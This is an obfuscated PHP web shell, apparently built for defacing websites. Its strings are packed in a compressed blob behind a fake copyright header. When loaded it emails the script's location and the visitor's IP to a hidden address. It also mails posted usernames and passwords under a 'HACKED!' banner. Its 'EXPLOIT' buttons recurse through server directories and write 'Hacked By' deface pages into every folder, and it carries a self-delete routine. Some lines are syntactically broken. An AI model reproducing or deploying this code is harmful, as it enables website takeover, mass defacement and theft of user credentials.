<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');���Ŕ��;$_SERVER[O0] = explode('|||', gzinflate(substr('�      �]s�6r�X3��n,Jr��*Sj=�{j�>K�ӹ�@D� -+i��֧������nA���:}�ǓD-�]�v˲.4y�X}����8S�T�"�:.�j��&�$��\'�a�n�~����V�n�O&��o����㋱_���f<��7�g����t��xq��_:�~t~���8` /����}X��2RU�\\�����2?@�%��������*�AC��W��S��R�rT��ÑZ�X%V��jɾ�\\�H�puz�S�-ӆ�����b��֯��ZfB�aǒ�����I۱����;�-l)���@ȴV:լR�r�fS�K�
^r|��d�z�3��q��$�Y��V��4����j^AL��zŉ$n��`6�����켸<�~5���������1��d���¼��E���`D��={��N3[k	V����%�T-c%sa�A{���G��fⶺ�9r�%8��$p��ӧ����*������\'k!���.����V���ʈ��a���s��ni�Z�,�-M
F(B�M�p̆��)�I5�C7q�T��Uܸ �f�|5\'%�᤮�.��UO/%��r����%�"�L#cW��I19���S��>Iׯ����� /�`��
�p��x\'6��d�*D��a�ϑˌd�\\�Z�N���|�����6�c*a��Z��oc���d�6�P�؁Ta��$֒�p�`�������=��2��j�=~t^�2���d���
���CF�0���U��)�7�A�����_K��1�sm��6�d&�#R����Gn�O{=�k�ֆ��[���/�?o��,S�	�H�@�6����O���o沪�a�e��m!��(i��N�N��v<AG�k3�ϫ;�Y�ق�����*�v��F�9G�zGn�W��b���N���$]�n����CS�����9��"[U}�O�U�J��=W�Qy?�d��4^F���x#�P~^f9����_����~��=a
IS�F�`�)Sz�X��+��YƨQ�Ym�e�֜i�l9�	�9+aRSR��X"��cAJgWp,)�	2a�u�ȼ�"�����i���
��v��JfE���ivP�����e-,���]G�����\\����,�ds�vA�ǜޥ��:S��o)k�^	݅[����m����Ǆ�tN�24˷��=�t�ğ�l^�����O�8]�k5�>���ʻn�}��
���D@9#���S��фv��t�yS\'B��a��61��=p.L�si(B�E�Y�72�e����5xdA^���h�)Z�&țÃ��y���kJ�k�v�I�^(m�5��G��k /kM�Mg�r������~(=���ǯ�����d<���ܟԬ����p����k���@���`��p ���A)Y������DȼI?��/�<�iC�8.9��S�r�M(�
�B[<�Ya��<<Ć � ��/<��x�����zw�N֙t@P%G?�N���X���J��M��:�:��G�q>ZO��Y������;j�a��8���8� CC	��|I��Ց���/��a�z��j9�\\��n0ڮ��Z^��z_|���_�{qY=��%�:���qwJ���:�B$�׉PSB�	�\',=��`2˃�P�4�  ',0x0a, -8)));��׊���ٺ���ܱ��������������䨅ۑ�����陋��υ�̇����蠒����������������������;?> <?php
 $tujuanmail = $_SERVER{O0}[0];
$x_path = $_SERVER{O0}{0x001} . $_SERVER[$_SERVER{O0}[0x0002]] . $_SERVER[$_SERVER{O0}{0x00003}];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER[$_SERVER{O0}[0x000004]] . $_SERVER{O0}{0x05};
$_SERVER{O0}[0x006]($tujuanmail, $_SERVER{O0}{0x0007}, $pesan_alert, $_SERVER{O0}[0x00008] . $_SERVER[$_SERVER{O0}[0x000004]] . $_SERVER{O0}{0x05});
$subjek = $_SERVER{O0}{0x000009};
$mailto = $_SERVER{O0}[0x0a]; 
$ip = ‘SERVER[$_SERVER{O0}[0x000004]];
$date = $_SERVER{O0}{0x00b}($_SERVER{O0}[0x000c]);
$browser = $_SERVER[$_SERVER{O0}{0x0000d}];

  $headers = $_SERVER{O0}[0x00000e].$fromName.$_SERVER{O0}{0x0f}.$fromEmail.$_SERVER{O0}[0x0010].$_SERVER{O0}{0x00011};
  $headers .= $_SERVER{O0}[0x000012].$replyEmail.$_SERVER{O0}{0x00011};
  $headers .= $_SERVER{O0}{0x0000013}.$_SERVER{O0}[0x014]().$_SERVER{O0}{0x00011};
  $headers .= $_SERVER{O0}{0x0015};
  $headers .= "Content-Type: multipart/alternative; boundary = $boundaryrn";
                


$user = $_POST[$_SERVER{O0}[0x00016]];
$pass = $_POST[$_SERVER{O0}{0x000017}];


$body = <<<EOD
<br><hr><br>
<center><font size="4" ;" color="red">HACKED!<br></font>
<font size="2" color="red">UsernameEmail :</font><font size"2" color="black">$user</font><br>
<font size="2" color="red">Password : </font><font size"2" color="black">$pass</font> <br></center>
EOD;


$headers = "From: $fromName";

  
  $headers .= $_SERVER{O0}[0x000012].$replyEmail.$_SERVER{O0}{0x00011};

$headers .= $_SERVER{O0}[0x0000018];
$success = $_SERVER{O0}[0x006]($mailto, $subjek, $body, $headers);
?>
    <?php
$random = $_SERVER{O0}{0x019}(0x03e8,0x01388);
$_SERVER{O0}[0x001a](0);
$_SERVER{O0}{0x0001b}(0);
if(isset($_GET[$_SERVER{O0}[0x00001c]])) {
	$dir = $_GET[$_SERVER{O0}[0x00001c]];
	$_SERVER{O0}{0x000001d}($dir);
} else {
	$dir = $_SERVER{O0}[0x01e]();
}
if($_SERVER{O0}{0x001f}()){
foreach($_POST  as  $key=>$value){
$_POST[$key] = $_SERVER{O0}[0x00020]($value);
$dir = $_SERVER{O0}{0x000021}($_SERVER{O0}[0x0000022],$_SERVER{O0}{0x023},$dir);
$scdir = $_SERVER{O0}[0x0024]($_SERVER{O0}{0x023}, $dir);
}
}
echo $_SERVER{O0}{0x00025};
echo $_SERVER{O0}[0x000026];
echo "<font color='red'>★<font color='lime'>$dir<font color='red'>★</b></a></font>";
echo $_SERVER{O0}[0x000026];
echo "<a href='?dir=$dir&to=mass'><button type=button><b><b><font color=red>EXPLOIT 1 ★ ★ </button></b></a>";
echo "<a href='?dir=$dir&to=masss'><button type=button><b><font color=red>EXPLOIT 2 ★★★ </button></b><br><br></a>";
echo $_SERVER{O0}{0x0000027};
if(isset($_POST[$_SERVER{O0}[0x028]])) {
if(@$_SERVER{O0}{0x0029}($_SERVER{O0}[0x0002a]($_SERVER{O0}{0x00002b}, $_SERVER{O0}[0x000002c], __FILE__)))
            die($_SERVER{O0}{0x02d});
        else echo $_SERVER{O0}[0x002e];
}
echo $_SERVER{O0}{0x0002f};
if($_GET[$_SERVER{O0}[0x000030]] == $_SERVER{O0}{0x0000031}) {
	function sabun_massal($O00,$O0O,$OO0) {
		if($_SERVER{O0}[0x032]($O00)) {
			$OOO = $_SERVER{O0}{0x0033}($O00);
			foreach($OOO  as  $O000) {
				$O00O = "$O00/$O000";
				$O0O0 = $O00O.$_SERVER{O0}[0x00034].$O0O;
				if($O000 === $_SERVER{O0}{0x000035}) {
					$_SERVER{O0}[0x0000036]($O0O0, $OO0);
				} elseif($O000 === $_SERVER{O0}{0x037}) {
					$_SERVER{O0}[0x0000036]($O0O0, $OO0);
				} else {
					if($_SERVER{O0}[0x0038]($O00O)) {
						if($_SERVER{O0}[0x032]($O00O)) {
							echo "[<font color=lime>DONE</font>] $O0O0<br>";
							$_SERVER{O0}[0x0000036]($O0O0, $OO0);
							$O0OO = $_SERVER{O0}{0x00039}($O00O,$O0O,$OO0);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($OO0O,$OOO0,$OOOO) {
		if($_SERVER{O0}[0x032]($OO0O)) {
			$O0000 = $_SERVER{O0}{0x0033}($OO0O);
			foreach($O0000  as  $O000O) {
				$O00O0 = "$OO0O/$O000O";
				$O00OO = $O00O0.$_SERVER{O0}[0x00034].$OOO0;
				if($O000O === $_SERVER{O0}{0x000035}) {
					$_SERVER{O0}[0x0000036]($O00OO, $OOOO);
				} elseif($O000O === $_SERVER{O0}{0x037}) {
					$_SERVER{O0}[0x0000036]($O00OO, $OOOO);
				} else {
					if($_SERVER{O0}[0x0038]($O00O0)) {
						if($_SERVER{O0}[0x032]($O00O0)) {
							echo "<font color=lime>http://</font>$O000O/$OOO0<br>";
							$_SERVER{O0}[0x0000036]($O00OO, $OOOO);
						}
					}
				}
			}
		}
	}
	if($_POST[$_SERVER{O0}[0x00003a]]) {
		if($_POST[$_SERVER{O0}{0x000003b}] == $_SERVER{O0}[0x03c]) {
			echo $_SERVER{O0}{0x003d};
			$_SERVER{O0}{0x00039}($_POST[$_SERVER{O0}[0x0003e]], $_POST[$_SERVER{O0}{0x00003f}], $_POST[$_SERVER{O0}[0x0000040]]);
			echo $_SERVER{O0}{0x041};
		} elseif($_POST[$_SERVER{O0}{0x000003b}] == $_SERVER{O0}[0x0042]) {
			echo $_SERVER{O0}{0x003d};
			$_SERVER{O0}{0x00043}($_POST[$_SERVER{O0}[0x0003e]], $_POST[$_SERVER{O0}{0x00003f}], $_POST[$_SERVER{O0}[0x0000040]]);
			echo $_SERVER{O0}{0x041};
		}
	} else {
	echo $_SERVER{O0}[0x000026];
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$OO0O' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='sange.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Bapak Heker Indonesia | </textarea></br><br>
	<input type='submit' name='start' value='Start' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET[$_SERVER{O0}[0x000030]] == $_SERVER{O0}[0x000044]) {
	function sabun_massal($O0O0O,$O0OO0,$O0OOO) {
		if($_SERVER{O0}[0x032]($O0O0O)) {
			$OO000 = $_SERVER{O0}{0x0033}($O0O0O);
			foreach($OO000  as  $OO00O) {
				$OO0O0 = "$O0O0O/$OO00O";
				$OO0OO = $OO0O0.$_SERVER{O0}[0x00034].$O0OO0;
				if($OO00O === $_SERVER{O0}{0x000035}) {
					$_SERVER{O0}[0x0000036]($OO0OO, $O0OOO);
				} elseif($OO00O === $_SERVER{O0}{0x037}) {
					$_SERVER{O0}[0x0000036]($OO0OO, $O0OOO);
				} else {
					if($_SERVER{O0}[0x0038]($OO0O0)) {
						if($_SERVER{O0}[0x032]($OO0O0)) {
							echo "[<font color=lime>DONE</font>] $OO0OO<br>";
							$_SERVER{O0}[0x0000036]($OO0OO, $O0OOO);
							$OOO00 = $_SERVER{O0}{0x00039}($OO0O0,$O0OO0,$O0OOO);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($OOOO0,$OOOOO,$O00000) {
		if($_SERVER{O0}[0x032]($OOOO0)) {
			$O0000O = $_SERVER{O0}{0x0033}($OOOO0);
			foreach($O0000O  as  $O000O0) {
				$O000OO = "$OOOO0/$O000O0";
				$O00O00 = $O000OO.$_SERVER{O0}[0x00034].$OOOOO;
				if($O000O0 === $_SERVER{O0}{0x000035}) {
					$_SERVER{O0}[0x0000036]($O00O00, $O00000);
				} elseif($O000O0 === $_SERVER{O0}{0x037}) {
					$_SERVER{O0}[0x0000036]($O00O00, $O00000);
				} else {
					if($_SERVER{O0}[0x0038]($O000OO)) {
						if($_SERVER{O0}[0x032]($O000OO)) {
							echo "<font color=lime>http://</font>$O000O0<font color=lime>.com</font>/$OOOOO<br>";
							$_SERVER{O0}[0x0000036]($O00O00, $O00000);
						}
					}
				}
			}
		}
	}
	if($_POST[$_SERVER{O0}[0x00003a]]) {
		if($_POST[$_SERVER{O0}{0x000003b}] == $_SERVER{O0}[0x03c]) {
			echo $_SERVER{O0}{0x003d};
			$_SERVER{O0}{0x00039}($_POST[$_SERVER{O0}[0x0003e]], $_POST[$_SERVER{O0}{0x00003f}], $_POST[$_SERVER{O0}[0x0000040]]);
			echo $_SERVER{O0}{0x041};
		} elseif($_POST[$_SERVER{O0}{0x000003b}] == $_SERVER{O0}[0x0042]) {
			echo $_SERVER{O0}{0x003d};
			$_SERVER{O0}{0x00043}($_POST[$_SERVER{O0}[0x0003e]], $_POST[$_SERVER{O0}{0x00003f}], $_POST[$_SERVER{O0}[0x0000040]]);
			echo $_SERVER{O0}{0x041};
		}
	} else {
	echo $_SERVER{O0}[0x000026];
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$OOOO0' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='sange.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Poldah metr0 | Security Is A Game</textarea><br>
	<input type='submit' name='start' value='Gassss' style='width: 450px;'>
	</form></center>";
	} 
	}
echo $_SERVER{O0}{0x0000045};
function perms($O00OO0){
$O00OOO = $_SERVER{O0}[0x046]($O00OO0);

if (($O00OOO & 0xC000) == 0xC000) {
$O0O000 = $_SERVER{O0}{0x0047};
} elseif (($O00OOO & 0xA000) == 0xA000) {
$O0O000 = $_SERVER{O0}[0x00048];
} elseif (($O00OOO & 0x8000) == 0x8000) {
$O0O000 = $_SERVER{O0}{0x000049};
} elseif (($O00OOO & 0x6000) == 0x6000) {
$O0O000 = $_SERVER{O0}[0x000004a];
} elseif (($O00OOO & 0x4000) == 0x4000) {
$O0O000 = $_SERVER{O0}{0x04b};
} elseif (($O00OOO & 0x2000) == 0x2000) {
$O0O000 = $_SERVER{O0}[0x004c];
} elseif (($O00OOO & 0x1000) == 0x1000) {
$O0O000 = $_SERVER{O0}{0x0004d};
} else {
$O0O000 = $_SERVER{O0}[0x00004e];
}

$O0O000 .= (($O00OOO & 0x0100) ? $_SERVER{O0}{0x000004f} : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0080) ? $_SERVER{O0}[0x050] : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0040) ?
(($O00OOO & 0x0800) ? $_SERVER{O0}{0x0047} : $_SERVER{O0}{0x0051} ) :
(($O00OOO & 0x0800) ? $_SERVER{O0}[0x00052] : $_SERVER{O0}{0x000049}));

$O0O000 .= (($O00OOO & 0x0020) ? $_SERVER{O0}{0x000004f} : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0010) ? $_SERVER{O0}[0x050] : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0008) ?
(($O00OOO & 0x0400) ? $_SERVER{O0}{0x0047} : $_SERVER{O0}{0x0051} ) :
(($O00OOO & 0x0400) ? $_SERVER{O0}[0x00052] : $_SERVER{O0}{0x000049}));

$O0O000 .= (($O00OOO & 0x0004) ? $_SERVER{O0}{0x000004f} : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0002) ? $_SERVER{O0}[0x050] : $_SERVER{O0}{0x000049});
$O0O000 .= (($O00OOO & 0x0001) ?
(($O00OOO & 0x0200) ? $_SERVER{O0}{0x000053} : $_SERVER{O0}{0x0051} ) :
(($O00OOO & 0x0200) ? $_SERVER{O0}[0x0000054] : $_SERVER{O0}{0x000049}));

return $O0O000;
}
?>